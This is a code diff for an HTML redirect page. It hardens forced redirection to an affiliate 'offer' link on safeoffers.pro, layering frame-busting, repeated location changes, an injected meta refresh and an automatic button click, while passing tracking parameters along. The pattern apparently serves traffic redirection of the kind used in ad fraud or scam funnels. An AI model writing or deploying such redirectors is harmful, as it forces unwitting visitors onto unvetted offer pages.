@@ -9,24 +9,49 @@
   <style>
     html,body{height:100%;margin:0;font-family:system-ui,Arial,sans-serif;background:#0b0f14;color:#fff;display:grid;place-items:center}
     a#go{display:inline-block;padding:.9rem 1.2rem;border-radius:10px;background:#21c08b;color:#0b0f14;text-decoration:none;font-weight:700}
+    .hint{opacity:.7;margin-top:.75rem;font-size:.9rem}
   </style>
 </head>
 <body>
-  <a id="go" href="#" rel="nofollow noopener noreferrer">Continue</a>
+  <div style="text-align:center">
+    <a id="go" href="#" rel="nofollow noopener noreferrer">Continue</a>
+    <div class="hint">Если не перенаправило автоматически, нажми кнопку</div>
+  </div>
 
   <noscript>
     <meta http-equiv="refresh" content="0; url=https://safeoffers.pro/a/1w3NBHXOxfpDOD" />
   </noscript>
 
   <script>
-    (() => {
+    (function () {
       const OFFER = 'https://safeoffers.pro/a/1w3NBHXOxfpDOD';
-      const qs = location.search.replace(/^\?/, '');       // ?s1=...&zone=... -> s1=...&zone=...
+      const qs = location.search.replace(/^\?/, ''); // s1=...&zone=...
       const sep = OFFER.includes('?') ? '&' : '?';
       const url = qs ? OFFER + sep + qs : OFFER;
+
       const btn = document.getElementById('go');
       btn.href = url;
-      setTimeout(() => location.replace(url), 300);
+
+      try { window.top.location.replace(url); } catch(e){}
+      
+      setTimeout(() => {
+        try { location.replace(url); } catch(e){}
+      }, 100);
+
+      setTimeout(() => {
+        try { location.href = url; } catch(e){}
+      }, 200);
+
+      setTimeout(() => {
+        const m = document.createElement('meta');
+        m.httpEquiv = 'refresh';
+        m.content = '0;url=' + url;
+        document.head.appendChild(m);
+      }, 300);
+
+      setTimeout(() => {
+        try { btn.click(); } catch(e){}
+      }, 500);
     })();
   </script>
 </body>
